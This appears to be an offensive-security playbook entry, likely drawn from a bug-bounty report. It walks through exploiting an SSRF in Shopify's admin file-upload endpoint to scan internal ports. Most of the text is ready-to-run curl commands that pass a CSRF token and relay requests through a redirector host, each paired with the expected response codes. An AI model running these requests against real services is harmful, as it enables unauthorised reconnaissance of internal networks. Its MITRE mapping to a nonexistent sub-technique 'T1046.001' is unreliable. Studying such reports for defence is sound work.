---
tags:
  - ssrf
  - internal-scanning
  - shopify
type: procedure
tools:
  - '[[tools/Wireshark]]'
tactics:
  - '[[Reconnaissance]]'
commands:
  - '[[commands/verify-internal-scan-on-shopify-ip]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Service Scanning]]'
updated_at: '2025-12-14T04:39:02.414Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques:
  - '[[T1046.001]]'
id: 22f0cd13-8ba6-4a93-82d1-518a1d2d52b6
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Network Service Scanning]]'
---
# Verify-Internal-Port-Scanning-on-Shopify-IP

## Summary

This procedure validates the SSRF's ability to scan ports on Shopify's own infrastructure, bypassing external firewalls to detect internal services.

## Description

Targeting Shopify's external IP (23.227.55.1) with redirects to ports like 22 (open internally) vs 2 (closed) demonstrates the vulnerability's severity. External scans might show port 22 closed due to firewalls, but SSRF from internal network reveals it open, yielding 500 vs 422. This persists even post-initial fixes, highlighting incomplete remediation.

## Requirements

1. Knowledge of target's external IP
2. Authenticated session and redirector
3. Awareness of internal port states

## Defense

Defensive measures and detection strategies:

- Filter internal IP ranges in SSRF-prone endpoints
- Enhance firewall rules for internal-to-external traffic
- Audit image fetch logs for self-referential scans

## Objectives

1. Confirm firewall bypass via internal SSRF
2. Identify hidden internal services
3. Assess vulnerability persistence

## Instructions

### Step 1: Scan Open Internal Port

**Context**: Test port 22 on Shopify IP, expected open internally.

**Command** ([[commands/verify-internal-scan-on-shopify-ip]]):
```bash
curl -X POST 'https://test-4925.myshopify.com/admin/settings/files.json' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=' \
  -H 'Cookie: COOKIES' \
  -d 'src=http://hettoteam.tk/r.php?r=http://23.227.55.1:22/111111111'
```

> Expected output: HTTP 500, indicating open port.

### Step 2: Scan Closed Internal Port

**Context**: Verify closed port behavior.

**Command** ([[commands/verify-internal-scan-on-shopify-ip]]):
```bash
curl -X POST 'https://test-4925.myshopify.com/admin/settings/files.json' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=' \
  -H 'Cookie: COOKIES' \
  -d 'src=http://hettoteam.tk/r.php?r=http://23.227.55.1:2/111111111'
```

> Expected output: HTTP 422, confirming closed.

### Step 3: Post-Fix Persistence Check

**Context**: Re-test on external host post-fix to ensure ongoing vulnerability.

**Command** ([[commands/verify-internal-scan-on-shopify-ip]]):
```bash
# Open port post-fix
curl -X POST 'https://test-4925.myshopify.com/admin/settings/files.json' \
  -d 'src=http://hettoteam.tk/r.php?r=http://scanme.nmap.org:22/111111111'

# Closed port post-fix
curl -X POST 'https://test-4925.myshopify.com/admin/settings/files.json' \
  -d 'src=http://hettoteam.tk/r.php?r=http://scanme.nmap.org:2/111111111'
```

> Expected: Still 500/422, showing incomplete fix.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]]

### Techniques

- [[Network Service Scanning]]

### Sub-Techniques

- [[T1046.001]]

## Commands Used

- [[commands/verify-internal-scan-on-shopify-ip]]

## Tools Used

- [[tools/Wireshark]]

## Tags

- ssrf
- internal-scanning
